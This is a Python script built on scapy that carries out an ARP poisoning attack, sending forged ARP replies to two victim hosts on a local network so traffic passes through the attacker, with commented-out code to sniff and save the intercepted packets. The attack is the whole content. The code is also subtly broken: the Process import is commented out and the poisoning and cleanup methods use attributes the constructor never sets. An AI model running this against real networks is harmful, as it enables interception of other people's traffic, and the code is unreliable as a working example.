# Packages
# from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, getmacbyip
import sys
import time

# Constants
DIVIDER = '-' * 50

# ARP Poisoning Attack
class ARPPoisoningAttack():
    # Constructs the ARP Poisoning Attack
    def __init__(self, victimOneIP, victimTwoIP, interface):
        # Assign targets
        self.victimOneIP = victimOneIP
        self.victimTwoIP = victimTwoIP
        self.interface = interface

        # Assign default scapy interface
        conf.iface = interface

        # Assign macAddresses
        self.victimOneMac = getmacbyip(victimOneIP)
        self.victimTwoMac = getmacbyip(victimTwoIP)
        self.deviceMac = get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPPoisoningAttack({}, {}, {})'.format(self.victimOneIP, self.victimTwoIP, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP Poisoning Attack on {}:\n - Victim One IP {} at {}\n - Victim Two IP {} at {}'.format(
                self.interface, self.victimOneIP, self.victimOneMac, self.victimTwoIP, self.victimTwoMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Start ARP Poisoning Attack
        #self.poisonDevices()

        self.poison_thread = Process(target = self.poisonDevices)
        self.poison_thread.start()
        self.poison_thread.join()

        #try:
            # Start Poisoning Attack Thread
            #self.poison_thread = Process(target = self.poisonDevices)
           # self.poison_thread.start()
        #except KeyboardInterrupt: # CTRL-C was pressed
            #self.poison_thread.stop()
        
        
        # Start Sniffing Attack Thread
#        self.sniff_thread = Process(target = self.sniffPackets)
#        self.sniff_thread.start()

    # Sends poisoned ARP packets to the victim and spoofed device
    def poisonDevices(self):
        # ARP Poisoning packet for the victim
        victimPoisonPacket = ARP(hwsrc = self.deviceMac,
                           psrc = self.spoofedIP,
                           pdst = self.victimIP, 
                           hwdst = self.victimMac)

        # ARP Poisoning packet for the spoofed device
        spoofedPoisonPacket = ARP(hwsrc = self.deviceMac,
                            psrc = self.victimIP,
                            pdst = self.spoofedIP,
                            hwdst = self.spoofedMac)

        # Infinitely poisons the victim and the spoofed device
        while True:
            try: # Send poison packets
                send(victimPoisonPacket)
                send(spoofedPoisonPacket)

                time.sleep(2)
            except KeyboardInterrupt: # CTRL-C was pressed
                # Cleaning ARP tables
                self.clean()
                break
                #break

    # Sniffs packets between the victim and spoofed device 
#    def sniffPackets(self):
#        time.sleep(5)

        # Sniff an infinite amount of packets from both devices
#        packets = sniff(filter = "ip host {} || ip host {}".format(victimIP, spoofedIP))
        
        # Save sniffed packets
#        wrpcap('sniffedPackets.pcap', packets)
#        print('The sniffed packets have been saved')

#        self.poison_thread.terminate()

    # Clean ARP tables of the victim and spoofed device of references to the used device
    def clean(self):
        send(ARP(
            op=2,
            psrc=self.spoofedIP,
            hwsrc=self.spoofedMac,
            pdst=self.victimIP,
            hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(
            op=2,
            psrc=self.victimIP,
            hwsrc=self.victimMac,
            pdst=self.spoofedIP,
            hwdst='ff:ff:ff:ff:ff:ff'), count=5)

# Starts the program
if __name__ == '__main__':
    # Disables verbosity (command line) mode
    conf.verb = 0

    # Assign parameters to variables
    victimOneIP = sys.argv[1]
    victimTwoIP = sys.argv[2]
    interface = sys.argv[3]

    # Initialize Attack
    attack = ARPPoisoningAttack(victimOneIP, victimTwoIP, interface)

    # Execute attack
    attack.execute()
